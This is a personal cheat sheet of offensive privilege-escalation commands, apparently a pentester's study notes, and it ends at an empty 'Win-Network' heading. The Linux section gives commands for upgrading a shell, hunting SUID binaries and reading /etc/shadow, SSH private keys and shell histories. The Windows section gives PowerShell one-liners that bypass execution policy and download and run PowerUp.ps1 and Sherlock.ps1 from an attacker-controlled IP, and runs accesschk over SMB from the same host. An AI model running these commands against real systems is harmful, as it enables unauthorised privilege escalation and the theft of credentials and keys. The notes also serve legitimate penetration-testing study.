---
title: CheatSheet
date: 2024-03-01 12:43:32 
categories: [CheatSheet]
tags: [kendimenotlar] 
image: https://i.kym-cdn.com/entries/icons/original/000/021/807/ig9OoyenpxqdCQyABmOQBZDI0duHk2QZZmWg2Hxd4ro.jpg
---

# Privilege Escalation

## Linux PrivEsc

### Linux - Automated Scripts 

````
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
metasploit: multi/recon/local_exploit_suggester
````

### Interactive Shell 

````
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<> 
````


### Application Config Files 

````
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
````

### Cronjobs

````
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
ls -al /var/cron.log - check timestamps 
````

### Linux - Network

````
N
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
ip a 
ip addr

cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
````

### SUID Files

````

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
````

### İnfo

````
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

## Check for Sensitive info 
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
ls -ahlR /root/
ls -ahlR /home/

cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

## SSH KEYS
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
````

## Windows PrivEsc

### Windows - Automated Tools

````
Run winpeas 
Run PowerUp.ps1
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/PowerUp.ps1');Invoke-AllChecks"

Run Sherlock.ps1
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"

accesschk.exe /accepteula -wvu
Folder Perms 
\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\
File Perms 
\\192.168.119.155\test\accesschk.exe /accepteula -uwqs  "Authenticated Users" C:\*.*
\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*

Run JAWS

# Executables  
WinPEAS.exe /.bat * 
Seatbelt.exe 
Watson.exe * 
Sharpup.exe 
windows-privesc-check2.exe --dump -G

#Powershell 
Sherlock.ps1 * 
PowerUp.ps1 * 
jaws-enumps1 * 


#Other 
Windows-exploit-suggester.py *
Systeminfo -> a text file and run it with windows exploit suggester.py, search for exploit in SecWiki github 

MSF exploit suggester *
In a meterpreter session – run /post/multi/recon/local_exploit_suggester - > shows list of kernel
````

### Win-Network

````
